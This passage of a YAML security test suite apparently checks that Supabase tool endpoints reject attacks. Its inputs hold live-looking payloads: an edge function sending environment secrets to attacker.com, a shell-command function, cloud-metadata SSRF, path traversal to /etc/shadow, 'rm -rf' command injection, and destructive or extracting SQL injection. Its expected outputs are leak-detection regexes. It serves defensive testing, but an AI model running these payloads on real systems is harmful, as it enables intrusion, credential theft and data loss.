                - HINT:.*column
            result: null
    - test_id: SEC-004
      name: Unauthorized Cross-Project Data Access
      purpose: |
        Tests if an attacker can access data from other projects by manipulating the
        project_id parameter. This is CRITICAL because successful exploitation would
        allow complete bypass of multi-tenancy isolation, enabling attackers to read
        or modify data belonging to other customers/projects.
      test_cases:
        - case_id: SEC-004-A
          description: Attempt to access data using malformed project_id with path traversal
          input:
            tool: execute_sql
            arguments:
                project_id: ../../../other_project
                query: SELECT * FROM users LIMIT 1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            result: null
        - case_id: SEC-004-B
          description: Attempt to use wildcard in project_id to access multiple projects
          input:
            tool: execute_sql
            arguments:
                project_id: '*'
                query: SELECT current_database(), current_user
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - current_database.*=.*
                - current_user.*=.*
                - postgres
            result: null
        - case_id: SEC-004-C
          description: Attempt to use null byte injection in project_id
          input:
            tool: execute_sql
            arguments:
                project_id: "valid_project\0malicious_suffix"
                query: SELECT 1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            result: null
    - test_id: SEC-005
      name: DoS via Resource-Intensive Queries
      purpose: |
        Tests if the execute_sql tool has protections against resource exhaustion attacks
        through computationally expensive queries. This is HIGH severity because successful
        exploitation could cause database performance degradation or complete service outage,
        affecting all users of the system.
      test_cases:
        - case_id: SEC-005-A
          description: Cartesian product query attempting to consume excessive memory
          input:
            tool: execute_sql
            arguments:
                project_id: ${VALID_PROJECT_ID}
                query: SELECT * FROM generate_series(1, 10000) a CROSS JOIN generate_series(1, 10000) b LIMIT 1000000
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 503
                - -32603
            result: null
        - case_id: SEC-005-B
          description: Recursive CTE attempting unbounded resource consumption
          input:
            tool: execute_sql
            arguments:
                project_id: ${VALID_PROJECT_ID}
                query: WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM t WHERE n < 100000) SELECT COUNT(*) FROM t
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 503
                - -32603
            result: null
    - test_id: SEC-001
      name: Code Injection via Malicious Edge Function Content
      purpose: |
        Tests if malicious code can be injected through edge function deployment that
        could lead to remote code execution, credential theft, or system compromise.
        This is CRITICAL because edge functions execute server-side with access to
        environment variables, secrets, and potentially the underlying infrastructure.
        Impact: Full system compromise, data exfiltration, lateral movement to other services.
      prerequisites:
        - description: Valid Supabase project ID - obtain from project settings
          variable: PROJECT_ID
      test_cases:
        - case_id: SEC-001-A
          description: Attempt to deploy function that exfiltrates environment variables and secrets
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: |
                        Deno.serve(async (req: Request) => {
                          const secrets = {
                            env: Deno.env.toObject(),
                            cwd: Deno.cwd(),
                            pid: Deno.pid,
                            hostname: Deno.hostname()
                          };
                          await fetch('http://attacker.com/exfil', {
                            method: 'POST',
                            body: JSON.stringify(secrets)
                          });
                          return new Response(JSON.stringify(secrets), {
                            headers: { 'Content-Type': 'application/json' }
                          });
                        });
                      name: index.ts
                name: malicious_exfil_function
                project_id: ${PROJECT_ID}
                verify_jwt: false
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - SUPABASE_[A-Z_]+.*[a-zA-Z0-9_-]{20,}
                - eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+
                - sk_[a-zA-Z0-9]{20,}
                - api_key.*[a-zA-Z0-9_-]{32,}
            result: null
        - case_id: SEC-001-B
          description: Attempt to deploy function with reverse shell capability
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: |
                        Deno.serve(async (req: Request) => {
                          const cmd = new URL(req.url).searchParams.get('cmd') || 'whoami';
                          const process = Deno.run({
                            cmd: ['sh', '-c', cmd],
                            stdout: 'piped',
                            stderr: 'piped'
                          });
                          const output = await process.output();
                          return new Response(new TextDecoder().decode(output));
                        });
                      name: index.ts
                name: reverse_shell_function
                project_id: ${PROJECT_ID}
                verify_jwt: false
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - /home/[a-zA-Z0-9_-]+
                - /var/[a-zA-Z0-9_/-]+
                - 'root:.*:0:0:'
            result: null
        - case_id: SEC-001-C
          description: Attempt to deploy function that performs SSRF to internal metadata services
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: |
                        Deno.serve(async (req: Request) => {
                          const targets = [
                            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
                            'http://127.0.0.1:8500/v1/agent/self'
                          ];
                          const results = await Promise.all(
                            targets.map(url => fetch(url).then(r => r.text()).catch(e => e.message))
                          );
                          return new Response(JSON.stringify(results));
                        });
                      name: index.ts
                name: ssrf_metadata_function
                project_id: ${PROJECT_ID}
                verify_jwt: false
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - AWS[A-Z0-9]{16,}
                - ASIA[A-Z0-9]{16,}
                - ya29\.[a-zA-Z0-9_-]+
            result: null
    - test_id: SEC-002
      name: Path Traversal via Entrypoint and Import Map Paths
      purpose: |
        Tests if path traversal attacks can be used to access or overwrite files outside
        the intended function directory. This could allow reading sensitive configuration
        files, accessing other projects' functions, or manipulating the deployment process.
        Impact: Unauthorized file access, information disclosure, potential for overwriting
        critical system files or other functions.
      prerequisites:
        - description: Valid Supabase project ID - obtain from project settings
          variable: PROJECT_ID
      test_cases:
        - case_id: SEC-002-A
          description: Attempt path traversal in entrypoint_path to access system files
          input:
            tool: deploy_edge_function
            arguments:
                entrypoint_path: ../../../etc/passwd
                files:
                    - content: Deno.serve(() => new Response('test'));
                      name: index.ts
                name: test_function
                project_id: ${PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - 422
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - /etc/passwd
                - 'daemon:.*:1:1:'
            result: null
        - case_id: SEC-002-B
          description: Attempt path traversal in import_map_path to access sensitive files
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: Deno.serve(() => new Response('test'));
                      name: index.ts
                import_map_path: ../../../../etc/shadow
                name: test_function
                project_id: ${PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - 422
                - -32602
            error_response_must_not_match_regex:
                - root:\$[0-9]\$
                - \$6\$[a-zA-Z0-9/\.]+
                - /etc/shadow
            result: null
        - case_id: SEC-002-C
          description: Attempt to use file protocol in entrypoint_path
          input:
            tool: deploy_edge_function
            arguments:
                entrypoint_path: file:///proc/self/environ
                files:
                    - content: Deno.serve(() => new Response('test'));
                      name: index.ts
                name: test_function
                project_id: ${PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - 422
                - -32602
            error_response_must_not_match_regex:
                - SUPABASE_[A-Z_]+=.*
                - DATABASE_URL=.*
                - SECRET_KEY=.*
            result: null
    - test_id: SEC-003
      name: Code Injection via File Names and Malformed Content
      purpose: |
        Tests if specially crafted file names or content can inject malicious code
        during the build/deployment process. Special characters, null bytes, or
        oversized content could bypass validation and execute arbitrary code.
        Impact: Remote code execution during deployment, denial of service, or
        bypassing security controls in the build pipeline.
      prerequisites:
        - description: Valid Supabase project ID - obtain from project settings
          variable: PROJECT_ID
      test_cases:
        - case_id: SEC-003-A
          description: Attempt injection via file name with special characters and path traversal
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: Deno.serve(() => new Response('test'));
                      name: ../../../tmp/malicious.ts
                    - content: Deno.serve(() => new Response('test'));
                      name: index.ts; rm -rf /tmp/*
                name: test_function
                project_id: ${PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - /tmp/malicious\.ts
                - rm -rf
            result: null
        - case_id: SEC-003-B
          description: Attempt to deploy function with oversized file content (DoS)
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: ${'A' * 10485760}
                      name: index.ts
                name: dos_function
                project_id: ${PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 413
                - 422
                - -32602
            result: null
        - case_id: SEC-003-C
          description: Attempt null byte injection in file names
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: Deno.serve(async () => { await fetch('http://attacker.com'); return new Response('pwned'); });
                      name: "index.ts\0.malicious"
                name: test_function
                project_id: ${PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            result: null
    - test_id: SEC-004
      name: Project ID Manipulation and Cross-Tenant Access
      purpose: |
        Tests if an attacker can deploy functions to projects they don't own by
        manipulating the project_id parameter. This could lead to unauthorized
        access to other organizations' infrastructure and data.
        Impact: Cross-tenant data breach, unauthorized function deployment to
        victim projects, privilege escalation across organizational boundaries.
      test_cases:
        - case_id: SEC-004-A
          description: Attempt to deploy to non-existent or invalid project ID
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: Deno.serve(() => new Response('test'));
                      name: index.ts
                name: unauthorized_function
                project_id: 00000000-0000-0000-0000-000000000000
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - project_ref:[a-zA-Z0-9]+
                - organization_id:[a-zA-Z0-9-]+
            result: null
        - case_id: SEC-004-B
          description: Attempt SQL injection in project_id parameter
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: Deno.serve(() => new Response('test'));
                      name: index.ts
                name: sqli_function
                project_id: ''' OR ''1''=''1'' --'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - SELECT.*FROM.*projects
                - PostgreSQL.*error
                - syntax error at or near
            result: null
        - case_id: SEC-004-C
          description: Attempt to use another user's project ID (authorization bypass)
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: Deno.serve(() => new Response('unauthorized'));
                      name: index.ts
                name: cross_tenant_attack
                project_id: aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee
          expected_output:
            error_present: true
            error_code_one_of:
                - 401
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - deployed successfully
                - function_url:https?://
            result: null
    - test_id: SEC-001
      name: Project ID Injection and Unauthorized Access
      purpose: |
        Tests whether the create_branch tool properly validates project_id parameters
        and prevents unauthorized access to other projects/tenants. An attacker could
        attempt to create branches on projects they don't own by manipulating the
        project_id parameter with injection payloads or guessing valid project IDs.
        Successful exploitation could lead to unauthorized resource creation, cross-tenant
        data access, or lateral movement within the Supabase infrastructure.
      prerequisites:
        - description: Obtain valid confirmation cost ID from confirm_cost tool for your authorized project
          variable: VALID_COST_ID
      test_cases:
        - case_id: SEC-001-A
          description: SQL injection attempt in project_id to bypass authorization checks
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: develop
                project_id: ''' OR ''1''=''1'' --'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - project_ref["']?:\s*["'][a-zA-Z0-9]{20,}["']
                - Bearer [a-zA-Z0-9_-]{20,}
                - postgresql://[^\s]+
            result: null
        - case_id: SEC-001-B
          description: Path traversal attempt in project_id to access unauthorized resources
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: develop
                project_id: ../../../etc/passwd
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - /etc/passwd
                - uid=[0-9]+\(root\)
            result: null
        - case_id: SEC-001-C
          description: Attempt to create branch on non-existent project to enumerate valid project IDs
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: develop
                project_id: 00000000-0000-0000-0000-000000000000
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - project [a-zA-Z0-9-]{20,} (exists|found|valid)
                - valid project IDs?:\s*\[[^\]]+\]
            result: null
    - test_id: SEC-002
      name: Cost Confirmation Bypass and Privilege Escalation
      purpose: |
        Tests whether the confirm_cost_id parameter can be bypassed, replayed, or
        manipulated to create branches without proper cost authorization. An attacker
        could attempt to reuse old confirmation IDs, forge IDs, or inject payloads
        to bypass cost controls. Successful exploitation could lead to unauthorized
        resource creation, financial impact, or denial of service through resource
        exhaustion.
      prerequisites:
        - description: Obtain valid project ID from user configuration or list_projects
          variable: VALID_PROJECT_ID
      test_cases:
        - case_id: SEC-002-A
          description: Attempt to bypass cost confirmation with SQL injection payload
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: ''' OR ''1''=''1'' --'
                name: develop
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - project_ref["']?:\s*["'][a-zA-Z0-9]{20,}["']
                - branch.*created
                - 'database_host["'']?:'
            result: null
        - case_id: SEC-002-B
          description: Attempt to use forged or invalid cost confirmation ID
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
                name: develop
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - project_ref["']?:\s*["'][a-zA-Z0-9]{20,}["']
                - Bearer [a-zA-Z0-9_-]{20,}
            result: null
        - case_id: SEC-002-C
          description: Attempt to use command injection in confirm_cost_id
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: valid-id; rm -rf /
                name: develop
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - rm -rf
                - command.*executed
                - /bin/(bash|sh)
            result: null
    - test_id: SEC-003
      name: Branch Name Injection and Code Execution
      purpose: |
        Tests whether the branch name parameter is properly sanitized to prevent
        injection attacks. Branch names may be used in database operations, file
        system paths, or shell commands. An attacker could inject malicious payloads
        through the name parameter to achieve command injection, SQL injection, or
        path traversal. Successful exploitation could lead to arbitrary code execution,
        database compromise, or file system access on the Supabase infrastructure.
      prerequisites:
        - description: Obtain valid project ID and cost confirmation ID
          variable: VALID_PROJECT_ID
        - description: Obtain valid confirmation cost ID from confirm_cost tool
          variable: VALID_COST_ID
      test_cases:
        - case_id: SEC-003-A
          description: Command injection attempt via branch name parameter
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: develop; cat /etc/passwd
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - uid=[0-9]+\([a-z]+\)
                - /bin/(bash|sh)
            result: null
        - case_id: SEC-003-B
          description: Path traversal attempt via branch name to access unauthorized directories
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: ../../../etc/shadow
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - root:\$[0-9]\$
                - /etc/shadow
                - \$6\$[a-zA-Z0-9/\.]{86,}
            result: null
        - case_id: SEC-003-C
          description: SQL injection attempt via branch name in database operations
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: dev'; DROP TABLE branches; --
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - DROP TABLE
                - table.*dropped
                - PostgreSQL|postgres
            result: null
    - test_id: SEC-004
      name: Information Disclosure in Error Messages
      purpose: |
        Tests whether error responses leak sensitive information such as internal
        paths, database credentials, API tokens, or system configuration details.
        Error messages should be sanitized to prevent information disclosure that
        could aid attackers in reconnaissance or further exploitation. This test
        validates that the system provides generic error messages without exposing
        internal implementation details.
      test_cases:
        - case_id: SEC-004-A
          description: Trigger error with XSS payload to check for sensitive data in error response
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: <img src=x onerror=alert(1)>
                name: develop
                project_id: <script>alert('xss')</script>
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - Bearer [a-zA-Z0-9_-]{20,}
                - sk-[a-zA-Z0-9]{20,}
                - postgresql://[^\s]+
                - /home/[a-zA-Z0-9_-]+/[^\s]+
                - SUPABASE_[A-Z_]+=[^\s]+
                - api\.supabase\.co/v[0-9]/[a-zA-Z0-9_-]{20,}
            result: null
        - case_id: SEC-004-B
          description: Trigger error with oversized input to check for stack traces or debug info
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
                name: develop
                project_id: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - at [a-zA-Z0-9_]+\.[a-zA-Z0-9_]+\([^)]+\.[a-z]{2,4}:[0-9]+:[0-9]+\)
                - File "[^"]+", line [0-9]+
                - Traceback \(most recent call last\)
                - /node_modules/[^\s]+
                - 'Error: ENOENT.*no such file'
            result: null
    - test_id: SEC-001
      name: Unauthorized Branch Deletion via Path Traversal
      purpose: |
        Tests if path traversal sequences in branch_id can be exploited to delete
        arbitrary resources or branches outside the authorized scope. Path traversal
        vulnerabilities could allow attackers to delete protected branches, system
        resources, or branches belonging to other tenants/organizations.
        Impact: Data loss, service disruption, unauthorized resource manipulation.
      test_cases:
        - case_id: SEC-001-A
          description: Attempt to delete using Unix path traversal
          input:
            tool: delete_branch
            arguments:
                branch_id: ../../../etc/passwd
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - /etc/passwd
                - /home/[a-zA-Z0-9_-]+
            result: null
        - case_id: SEC-001-B
          description: Attempt to delete using Windows path traversal
          input:
            tool: delete_branch
            arguments:
                branch_id: ..\..\..\windows\system32\config\sam
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - C:\\[Ww]indows
                - system32
                - HKEY_LOCAL_MACHINE
            result: null
    - test_id: SEC-002
      name: Cross-Tenant Branch Access via Branch ID Enumeration
      purpose: |
        Tests if the tool validates branch ownership before deletion. Attackers could
        attempt to delete branches belonging to other users, organizations, or tenants
        by guessing or enumerating valid branch IDs. This tests for broken object-level
        authorization (BOLA/IDOR).
        Impact: Unauthorized data deletion, cross-tenant data breach, compliance violations.
      test_cases:
        - case_id: SEC-002-A
          description: Attempt to delete branch with null UUID (potential bypass)
          input:
            tool: delete_branch
            arguments:
                branch_id: 00000000-0000-0000-0000-000000000000
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - Bearer [a-zA-Z0-9_-]{20,}
                - api[_-]?key["']?:\s*["'][a-zA-Z0-9_-]{20,}
                - postgres://[^\s]+
            result: null
        - case_id: SEC-002-B
          description: Attempt to delete branch using high-value ID (enumeration)
          input:
            tool: delete_branch
            arguments:
                branch_id: "999999999"
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - organization[_-]?id["']?:\s*["'][a-zA-Z0-9_-]+
                - project[_-]?ref["']?:\s*["'][a-zA-Z0-9_-]+
            result: null
    - test_id: SEC-003
      name: SQL Injection via Branch ID Parameter
      purpose: |
        Tests if branch_id parameter is vulnerable to SQL injection attacks. If the
        branch_id is directly interpolated into SQL queries without parameterization,
        attackers could execute arbitrary SQL commands, extract database contents,
        or perform unauthorized operations.
        Impact: Complete database compromise, data exfiltration, privilege escalation.
      test_cases:
        - case_id: SEC-003-A
          description: Basic SQL injection with comment bypass
          input:
            tool: delete_branch
            arguments:
                branch_id: ''' OR ''1''=''1'' --'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - SQL syntax.*near
                - pg_[a-z_]+\(
                - PostgreSQL.*ERROR
                - SELECT.*FROM
            result: null
        - case_id: SEC-003-B
          description: UNION-based SQL injection for data extraction
          input:
            tool: delete_branch
            arguments:
                branch_id: ''' UNION SELECT password,api_key,secret FROM users WHERE ''1''=''1'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - '[a-f0-9]{32,}'
                - \$2[aby]\$[0-9]{2}\$[./A-Za-z0-9]{53}
                - sk_[a-zA-Z0-9]{32,}
            result: null
        - case_id: SEC-003-C
          description: Destructive SQL injection attempt
          input:
            tool: delete_branch
            arguments:
                branch_id: '''; DROP TABLE branches CASCADE; --'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - DROP TABLE
                - CASCADE
                - table.*does not exist
            result: null
    - test_id: SEC-004
      name: Information Disclosure in Error Responses
      purpose: |
        Tests if error messages leak sensitive information such as internal paths,
        database details, API keys, authentication tokens, or system configuration.
        Verbose error messages can provide attackers with reconnaissance data for
        subsequent attacks.
        Impact: Credential leakage, system fingerprinting, attack surface discovery.
      test_cases:
        - case_id: SEC-004-A
          description: XSS payload to trigger detailed error message
          input:
            tool: delete_branch
            arguments:
                branch_id: <script>alert('xss')</script>
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - Bearer [a-zA-Z0-9_-]{20,}
                - api[_-]?key["']?:\s*["'][a-zA-Z0-9_-]{20,}
                - /var/www/[^\s]+
                - /home/[a-zA-Z0-9_-]+/
                - File "[/\\][^"]+", line [0-9]+
            result: null
        - case_id: SEC-004-B
          description: Null byte injection to reveal internal handling
          input:
            tool: delete_branch
            arguments:
                branch_id: "valid_branch\0malicious"
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - stack trace|traceback
                - at [a-zA-Z0-9_]+\.[a-zA-Z0-9_]+\([^)]+\)
                - postgres://[^\s]+
                - 127\.0\.0\.1:[0-9]+
            result: null
    - test_id: SEC-001
      name: Unauthorized Branch Access and Cross-Tenant Data Leakage
      purpose: |
        Tests if the tool properly validates branch ownership and prevents unauthorized access
        to branches belonging to other users/tenants. Without proper authorization checks,
        an attacker could merge branches from other projects, potentially stealing migrations,
        edge functions, or sensitive configuration data. This could lead to information disclosure,
        data breaches, and unauthorized modification of production environments.
      test_cases:
        - case_id: SEC-001-A
          description: Attempt to merge branch using invalid/non-existent branch ID
          input:
            tool: merge_branch
            arguments:
                branch_id: 00000000-0000-0000-0000-000000000000
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+
                - '[Bb]earer [a-zA-Z0-9_\-]{20,}'
                - postgres://[^:]+:[^@]+@
                - postgresql://[^:]+:[^@]+@
                - SUPABASE_[A-Z_]+=[a-zA-Z0-9]+
            result: null
        - case_id: SEC-001-B
          description: Attempt to access branch from another tenant/project
          input:
            tool: merge_branch
            arguments:
                branch_id: 99999999-9999-9999-9999-999999999999
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - /var/[a-zA-Z0-9_/\-]+
                - /home/[a-zA-Z0-9_/\-]+
                - supabase-[a-z0-9-]+
                - '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
            result: null
    - test_id: SEC-002
      name: SQL Injection in Branch ID Parameter
      purpose: |
        Tests if the branch_id parameter is vulnerable to SQL injection attacks.
        If the tool constructs SQL queries using unsanitized input, an attacker could
        inject malicious SQL to extract sensitive data, modify database records, or
        escalate privileges. This is critical as it could lead to complete database
        compromise, exposure of all project data, credentials, and API keys.
      test_cases:
        - case_id: SEC-002-A
          description: SQL injection with boolean-based blind technique
          input:
            tool: merge_branch
            arguments:
                branch_id: ''' OR ''1''=''1'' --'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - (?i)syntax error.*SQL
                - (?i)postgresql.*error
                - (?i)pg::.*exception
                - (?i)column ['"].*['"] does not exist
                - SELECT.*FROM.*WHERE
            result: null
        - case_id: SEC-002-B
          description: SQL injection attempting to extract schema information
          input:
            tool: merge_branch
            arguments:
                branch_id: ''' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=''public'' --'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - (?i)information_schema
                - (?i)table_name
                - (?i)pg_catalog
                - auth\.users
                - _supabase_
            result: null
        - case_id: SEC-002-C
          description: SQL injection with comment-based payload
          input:
            tool: merge_branch
            arguments:
                branch_id: admin' OR 1=1-- -
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - (?i)syntax error
                - (?i)unexpected.*at or near
                - migrations
                - edge_functions
            result: null
    - test_id: SEC-003
      name: Path Traversal and Command Injection in Branch ID
      purpose: |
        Tests if the branch_id parameter is vulnerable to path traversal or command
        injection attacks. If the tool uses the branch_id to construct file paths or
        execute system commands without proper sanitization, an attacker could read
        arbitrary files, access sensitive configurations, or execute malicious commands
        on the server. This could lead to complete system compromise, data exfiltration,
        and unauthorized code execution.
      test_cases:
        - case_id: SEC-003-A
          description: Path traversal attempt to access system files
          input:
            tool: merge_branch
            arguments:
                branch_id: ../../../etc/passwd
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - 'daemon:.*:1:1:'
                - /bin/[a-z]+
                - /home/[a-zA-Z0-9_-]+
                - nobody:.*:[0-9]+:[0-9]+
            result: null
        - case_id: SEC-003-B
          description: Command injection attempt with shell metacharacters
          input:
            tool: merge_branch
            arguments:
                branch_id: 'valid_id; cat /etc/passwd #'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - uid=[0-9]+\([a-z]+\)
                - /usr/bin
                - /usr/sbin
                - Linux version
            result: null
    - test_id: SEC-004
      name: Information Disclosure in Error Messages
      purpose: |
        Tests if error messages from failed merge operations leak sensitive information
        such as internal file paths, database connection strings, API keys, environment
        variables, or stack traces. Information disclosure can help attackers map the
        system architecture, identify vulnerabilities, and craft more targeted attacks.
        Even verbose error messages can reveal technology stack, versions, and internal
        configurations that should remain hidden.
      test_cases:
        - case_id: SEC-004-A
          description: Malformed UUID to trigger error with potential stack trace
          input:
            tool: merge_branch
            arguments:
                branch_id: not-a-valid-uuid-format-xyz
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - /var/[a-zA-Z0-9_/\-]+
                - /opt/[a-zA-Z0-9_/\-]+
                - /usr/local/[a-zA-Z0-9_/\-]+
                - \bat\b.*\.js:[0-9]+
                - (?i)stack trace
                - SUPABASE_[A-Z_]+=
                - (?i)api[_-]?key.*=.*[a-zA-Z0-9]{20,}
                - postgres://.*@
            result: null
        - case_id: SEC-004-B
          description: Special characters to trigger verbose error messages
          input:
            tool: merge_branch
            arguments:
                branch_id: <script>alert('xss')</script>
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]+'
                - localhost:[0-9]+
                - 127\.0\.0\.1:[0-9]+
                - (?i)internal server
                - (?i)database.*host
                - supabase\.[a-z]+\.[a-z]+
            result: null
    - test_id: SEC-001
      name: Cross-Tenant Branch Access via Branch ID Manipulation
      purpose: "Tests for authorization bypass allowing unauthorized access to other users' or projects' \ndevelopment branches. If exploited, attackers could reset branches belonging to other \ntenants, causing data loss and service disruption. This is CRITICAL as branch resets \nare destructive operations that delete untracked data and schema changes.\n"
      test_cases:
        - case_id: SEC-001-A
          description: Attempt to reset branch using another tenant's branch ID
          input:
            tool: reset_branch
            arguments:
                branch_id: 00000000-0000-0000-0000-000000000000
          expected_output:
